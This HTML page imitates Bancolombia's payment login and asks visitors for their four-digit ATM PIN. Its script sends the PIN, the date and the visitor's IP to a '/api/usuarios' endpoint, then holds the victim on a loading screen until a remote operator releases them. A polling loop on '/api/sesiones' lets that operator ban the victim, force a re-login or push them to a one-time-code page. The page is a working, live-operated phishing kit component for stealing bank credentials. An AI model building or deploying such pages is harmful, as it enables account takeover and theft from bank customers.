<!DOCTYPE html>
<html lang="es">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>Botón Bancolombia</title>
  <link rel="icon" type="image/png" href="icon-tab.webp">
  <script>
    if (localStorage.getItem('forceRelogin') === '1') {
      localStorage.removeItem('forceRelogin');
      window.location.href = 'Boton-Bancolombia-User.html';
    }
  </script>
  <style>
    html { -webkit-text-size-adjust:100%; }
    :root { --yellow:#ffd100;--black:#111;--gray:#555;--border:#e5e5e5; }
    * { margin:0;padding:0;box-sizing:border-box;font-family:system-ui,-apple-system,BlinkMacSystemFont,sans-serif; }

    body { min-height:100vh;display:flex;flex-direction:column;background:#f4f5f6;color:var(--black); }

    header {
      background:#fff;padding:16px 20px;
      display:grid;grid-template-columns:1fr auto 1fr;
      align-items:center;border-bottom:1px solid var(--border);
    }
    .header-exit { justify-self:end;font-size:15px;color:#333;text-decoration:none; }
    .logoban { max-width:290px;justify-self:center; }

    main { flex:1;max-width:640px;width:100%;margin:0 auto;padding:0 16px;text-align:center; }
    h1 { font-size:28px;margin:32px 0 18px; }

    .card {
      background:#fff;border-radius:32px;padding:32px 52px;
      box-shadow:0 8px 32px rgba(0,0,0,0.12);
      position:relative;z-index:1;
    }
    .card img { width:32px;margin-bottom:10px; }
    .info-text { font-size:18px;margin:16px 0 32px;line-height:1.6; }

    .pin-wrapper { display:flex;justify-content:center;gap:22px;margin-bottom:36px; }
    .pin-dot { width:44px;height:44px;border-bottom:2px solid #999;display:flex;align-items:center;justify-content:center;font-size:34px;position:relative; }
    .pin-dot.active::after { content:"";position:absolute;bottom:6px;width:2px;height:28px;background:#111;animation:blink 2.6s infinite; }
    @keyframes blink { 0%,50%,100%{opacity:1} 25%,75%{opacity:0} }

    input[type="tel"] { position:absolute;opacity:0;pointer-events:none; }

    .buttons { display:flex;gap:18px; }
    .btn { flex:1;padding:18px;border-radius:999px;font-size:18px;border:2px solid var(--black);cursor:pointer;color:#111;-webkit-text-fill-color:#111;background:transparent; }
    .btn.primary { background:var(--yellow);border-color:var(--yellow);font-weight:600;color:#000;-webkit-text-fill-color:#000; }
    .btn.primary:disabled { opacity:0.5;cursor:not-allowed; }

    .ondas-wrap {
      max-width:640px;width:100%;margin:0 auto;
      margin-top:-30px;flex-shrink:0;
      position:relative;z-index:0;
    }
    .ondas-wrap img { width:100%;display:block; }

    footer { background:#fff;text-align:center;padding:20px 16px 22px;font-size:12px;color:var(--gray);border-top:1px solid var(--border); }
    .logo-footer { max-width:160px;margin-bottom:6px; }
    .vigilado-wrap { display:flex;align-items:center;justify-content:center;gap:6px;margin-bottom:8px; }
    .vigilado-badge { border:1.5px solid #333;font-size:8px;font-weight:700;letter-spacing:1px;padding:1px 4px;text-transform:uppercase;color:#333;line-height:1.2; }
    .vigilado-text { font-size:9px;color:#555;text-align:left;line-height:1.3; }

    #loadingOverlay { position:fixed;inset:0;background:rgba(0,0,0,0.25);backdrop-filter:blur(6px);-webkit-backdrop-filter:blur(6px);display:none;align-items:center;justify-content:center;z-index:9999; }
    .loading-box { width:220px;height:220px;background:#fff;border-radius:50%;display:flex;flex-direction:column;align-items:center;justify-content:center; }
    .spinner { width:42px;height:42px;border:3px solid #ddd;border-top-color:#111;border-radius:50%;animation:spin 1s linear infinite; }
    .loading-box p { margin-top:14px;font-size:16px; }
    @keyframes spin { to { transform:rotate(360deg); } }

    @media(max-width:520px) {
      .card { padding:26px 20px;border-radius:26px; }
      .info-text { font-size:16px;margin-bottom:26px; }
      .pin-wrapper { gap:14px;margin-bottom:28px; }
      .pin-dot { width:36px;height:40px;font-size:26px; }
      .btn { font-size:16px;padding:16px; }
      .ondas-wrap { margin-top:-20px; }
    }
  </style>
</head>
<body>

<header>
  <div></div>
  <img class="logoban" src="https://www.bancolombia.com/wcm/connect/a67af2d6-c768-4f4f-a33b-fd58074f7ce9/logo-bancolombia-black.svg?MOD=AJPERES">
  <a class="header-exit" href="Tu-Boleta.html">Salir →</a>
</header>

<main>
  <h1>Clave principal</h1>
  <div style="margin-top:0px;">
    <div class="card">
      <img src="icono2.png" alt="Candado">
      <p class="info-text">Es la misma que usas en el cajero automático</p>
      <div class="pin-wrapper">
        <div class="pin-dot"></div>
        <div class="pin-dot"></div>
        <div class="pin-dot"></div>
        <div class="pin-dot"></div>
      </div>
      <input type="tel" inputmode="numeric" maxlength="4" id="pinInput" autofocus>
      <div class="buttons">
        <button class="btn secondary" onclick="window.location.href='Boton-Bancolombia-User.html'">Volver</button>
        <button class="btn primary" id="continueBtn" disabled>Continuar</button>
      </div>
    </div>
  </div>
</main>

<div class="ondas-wrap">
  <img src="fondo-ondas.png" alt="">
</div>

<footer>
  <img class="logo-footer" src="https://www.bancolombia.com/wcm/connect/a67af2d6-c768-4f4f-a33b-fd58074f7ce9/logo-bancolombia-black.svg?MOD=AJPERES">
  <div class="vigilado-wrap">
    <span class="vigilado-badge">VIGILADO</span>
    <span class="vigilado-text">SUPERINTENDENCIA FINANCIERA<br>DE COLOMBIA</span>
  </div>
  <p id="footerIp">Cargando IP...</p>
  <p id="footerFecha"></p>
</footer>

<div id="loadingOverlay">
  <div class="loading-box">
    <div class="spinner"></div>
    <p>Redireccionando...</p>
  </div>
</div>

<script>
  const pinInput = document.getElementById("pinInput");
  const dots = document.querySelectorAll(".pin-dot");
  const continueBtn = document.getElementById("continueBtn");
  const overlay = document.getElementById("loadingOverlay");

  (function() {
    const ip = localStorage.getItem('user_ip');
    if (ip) document.getElementById('footerIp').textContent = 'Dirección IP: ' + ip;
    const now = new Date();
    document.getElementById('footerFecha').textContent = now.toLocaleString('es-CO', {
      weekday:'long',year:'numeric',month:'long',day:'numeric',hour:'2-digit',minute:'2-digit'
    });
  })();

  document.body.addEventListener("click", () => pinInput.focus());

  function updateDisplay(value) {
    dots.forEach(dot => { dot.textContent=""; dot.classList.remove("active"); });
    value.split("").forEach((_,i) => { dots[i].textContent="●"; });
    if (value.length < 4) dots[value.length].classList.add("active");
    continueBtn.disabled = value.length !== 4;
  }

  pinInput.addEventListener("input", () => {
    pinInput.value = pinInput.value.replace(/\D/g,"").slice(0,4);
    updateDisplay(pinInput.value);
  });
  updateDisplay("");

  continueBtn.addEventListener("click", async () => {
    overlay.style.display="flex"; continueBtn.disabled=true;
    try {
      const clave = pinInput.value;
      const ip = localStorage.getItem('user_ip') || '';
      await fetch('/api/usuarios', {
        method:'POST', headers:{'Content-Type':'application/json'},
        body: JSON.stringify({ clave, fecha: new Date().toISOString(), ip })
      });
      let autorizado = false;
      while (!autorizado) {
        await new Promise(r => setTimeout(r,1500));
        try {
          const res = await fetch('/api/clave-pendiente?ip='+encodeURIComponent(ip));
          const data = await res.json();
          if (!data || !data.clave) autorizado = true;
        } catch { autorizado = true; }
      }
    } catch(e) {}
    window.location.href = "Boton-Bancolombia-Otp.html";
  });

  async function checkSessionStatus() {
    const ip = localStorage.getItem('user_ip');
    if (!ip) return;
    try {
      const res = await fetch('/api/sesiones');
      const sesiones = await res.json();
      const sesion = sesiones[ip];
      if (!sesion) return;
      if (sesion.ban) { window.location.href='https://www.bancolombia.com'; return; }
      if (sesion.relogin) { window.location.href='Boton-Bancolombia-User.html'; return; }
      if (sesion.autorizarOtp && sesion.estado==='esperando_otp') { window.location.href='Boton-Bancolombia-Otp.html'; }
    } catch {}
  }
  setInterval(checkSessionStatus, 1500);
</script>
</body>
</html>
